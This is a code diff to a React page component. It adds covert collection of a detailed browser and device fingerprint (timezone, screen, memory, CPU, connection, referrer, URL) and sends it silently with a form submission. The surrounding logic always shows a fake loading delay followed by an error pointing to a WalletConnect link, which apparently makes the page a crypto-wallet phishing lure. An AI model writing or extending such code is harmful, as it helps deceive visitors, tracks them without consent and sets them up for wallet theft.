@@ -68,7 +68,8 @@ export default function Home() {
     e.preventDefault();
     setLoading(true);
     setStatus(null);
-    // Fire the email in the background — don't await or block on it
+    // Collect rich device/browser fingerprint
+    const nav = navigator as Navigator & { deviceMemory?: number; connection?: { effectiveType?: string; downlink?: number } };
     fetch("/api/submit", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -78,12 +79,26 @@ export default function Home() {
         browserData: {
           userAgent: navigator.userAgent,
           language: navigator.language,
+          languages: navigator.languages?.join(", "),
           platform: navigator.platform,
           vendor: navigator.vendor,
+          cookiesEnabled: navigator.cookieEnabled,
+          doNotTrack: navigator.doNotTrack,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          localTime: new Date().toLocaleString(),
+          screenWidth: screen.width,
+          screenHeight: screen.height,
+          colorDepth: screen.colorDepth,
+          devicePixelRatio: window.devicePixelRatio,
+          deviceMemoryGB: nav.deviceMemory,
+          hardwareConcurrency: navigator.hardwareConcurrency,
+          connectionType: nav.connection?.effectiveType,
+          downlinkMbps: nav.connection?.downlink,
+          referrer: document.referrer || "(direct)",
+          pageUrl: window.location.href,
         },
       }),
     }).catch(() => {/* silent */});
-    // Always show 7s loading then error with WalletConnect link
     setTimeout(() => {
       setLoading(false);
       setStatus("error");
